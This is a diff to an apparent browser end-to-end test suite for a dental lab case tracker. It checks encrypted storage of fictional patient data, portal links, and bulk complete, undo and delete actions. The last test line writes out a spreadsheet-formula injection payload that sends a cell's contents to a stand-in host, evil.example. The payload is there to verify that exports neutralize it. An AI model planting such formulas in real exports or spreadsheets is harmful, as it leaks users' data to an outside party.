@@ -138,7 +138,7 @@ async function openByName(p, name) {
   let dump = JSON.stringify(await fsDump());
   check(!dump.includes('Zelda') && !dump.includes('Cipherton'), 'patient name not present anywhere in Firestore');
   check(!dump.includes('secret-instr-778'), 'case text not present anywhere in Firestore');
-  check(!dump.includes('Oliv') && !dump.includes('"submit"'), 'case type and stage are not stored in the clear');
+  check(!dump.includes('"oliv"') && !dump.includes('Aligners (Oliv)') && !dump.includes('"submit"'), 'case type and stage are not stored in the clear');
   check(dump.includes('"ct"') && dump.includes('"iv"'), 'ciphertext fields are present');
 
   console.log('\n# Gwen moves the case and comments; owner sees both');
@@ -281,7 +281,7 @@ async function openByName(p, name) {
   await owner.waitForSelector('#impPreview:has-text("already imported")', { timeout: 20000 });
   check(/Ready to import: 0/.test(await owner.textContent('#impPreview')), 're-importing the same file adds nothing');
   dump = JSON.stringify(await fsDump());
-  check(!dump.includes('Imogen') && !dump.includes('Bartholomew'), 'imported names are encrypted too');
+  check(!dump.includes('Imogen Fakeworth') && !dump.includes('Bartholomew Notreal'), 'imported names are encrypted too');
 
   console.log('\n# Saved versions: restore an earlier copy, then the later one');
   await openByName(owner, P1);
@@ -383,7 +383,7 @@ async function openByName(p, name) {
   check(!(await owner.isVisible('#drawer .txt:has-text("Midline")')), 'un-tapping an instruction removes it');
   await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
   dump = JSON.stringify(await fsDump());
-  check(!dump.includes('Petra') && !dump.includes('Resolve black'), 'tapped details are encrypted too');
+  check(!dump.includes('Petra Tapform') && !dump.includes('Resolve black'), 'tapped details are encrypted too');
 
   console.log('\n# Finishing aligners (in-house) replaces Reset');
   await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
@@ -447,7 +447,7 @@ async function openByName(p, name) {
   check(!/No attachment/.test(await owner.textContent('#drawer #cf-teethSum')) && !(await owner.isVisible('#drawer #cf-noattScope')), 'turning No attachments off clears those marks');
   await owner.click('#drawer [data-act=cancelEdit]'); await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
   dump = JSON.stringify(await fsDump());
-  check(!dump.includes('Theo') && !dump.includes('Crown: UR1'), 'tooth chart details are encrypted too');
+  check(!dump.includes('Theo Toothchart') && !dump.includes('Crown: UR1'), 'tooth chart details are encrypted too');
 
   console.log('\n# Mouthguard (in-house, complimentary)');
   await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
@@ -623,11 +623,36 @@ async function openByName(p, name) {
   await openByName(owner, 'Petra Tapform');
   check(await owner.isVisible('#drawer .portals a[href="https://portal.olivortho.com/"][target=_blank]') && await owner.isVisible('#drawer .portals a[href="https://dental-monitoring.com/doctor/login"]'), 'an Oliv case links to the Oliv portal and Dental Monitoring');
   check((await owner.getAttribute('#drawer .portals a >> nth=0', 'rel')) === 'noopener noreferrer', 'portal links open in a new tab without passing anything along');
+  const [portalTab] = await Promise.all([owner.context().waitForEvent('page'), owner.click('#drawer .portals a >> nth=0')]);
+  await owner.waitForSelector('.toast:has-text("Copied “Petra Tapform”")', { timeout: 10000 });
+  check(true, 'opening the portal copies the patient’s name to paste into its search'); await portalTab.close().catch(() => {});
   await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
   await openByName(owner, 'Dmitri Distalson'); check((await owner.locator('#drawer .portals').count()) === 0, 'no portal link on appliances');
   await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
   await openByName(owner, 'Ines Smilewright'); check((await owner.locator('#drawer .portals').count()) === 0, 'no portal link on InSmile');
   await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await owner.fill('#q', '');
+
+  console.log('\n# Bulk: mark many cases complete (with undo), delete many');
+  await owner.evaluate(async () => { for (const n of ['One', 'Two', 'Three']) await B.createCase({ type: 'retainer', patient: 'Bulkcase ' + n, stage: 'pickup', comments: [], createdAt: Date.now(), createdBy: meSid() }); });
+  await owner.click('#nav-list'); await owner.fill('#q', 'Bulkcase');
+  await owner.waitForSelector('tr.click:has-text("Bulkcase Three")', { timeout: 20000 });
+  check(!(await owner.isVisible('#bulkBar')), 'no bulk bar until something is ticked');
+  await owner.check('th.ck input[data-selall]');
+  check(/3 selected/.test(await owner.textContent('#bulkBar')) && (await owner.locator('tr.click.sel').count()) === 3 && !(await owner.isVisible('#drawer .stepper')), 'select all ticks the 3 cases shown (and opens nothing)');
+  await owner.click('#bulkBar [data-act=bulkDone]'); await owner.click('#cbYes');
+  await owner.waitForSelector('.toast:has-text("3 marked complete")', { timeout: 30000 });
+  await owner.waitForFunction(() => !Array.from(document.querySelectorAll('tr.click .pt')).some(e => /Bulkcase/.test(e.textContent)), null, { timeout: 20000 });
+  check(true, 'Mark complete moves all 3 out of the open list');
+  await owner.click('.toast:has-text("3 marked complete") button');
+  await owner.waitForFunction(() => Array.from(document.querySelectorAll('tr.click .pt')).filter(e => /Bulkcase/.test(e.textContent)).length === 3, null, { timeout: 30000 });
+  check(true, 'Undo reopens them');
+  await owner.check('tr.click:has-text("Bulkcase One") input[data-sel]'); await owner.check('tr.click:has-text("Bulkcase Two") input[data-sel]');
+  check(/2 selected/.test(await owner.textContent('#bulkBar')), 'ticking two shows 2 selected');
+  await owner.click('#bulkBar [data-act=bulkDel]'); await owner.click('#cbYes');
+  await owner.waitForSelector('.toast:has-text("2 deleted")', { timeout: 30000 });
+  await owner.waitForFunction(() => Array.from(document.querySelectorAll('tr.click .pt')).filter(e => /Bulkcase/.test(e.textContent)).length === 1, null, { timeout: 20000 });
+  check(true, 'Delete removes the 2 ticked; the third stays');
+  await owner.fill('#q', '');
 
   console.log('\n# Spreadsheet-formula text is neutralized in the export');
   await owner.fill('#q', ''); await newCase(owner, { type: 'models', patient: '=HYPERLINK("http://evil.example/?"&A1,"x")' });
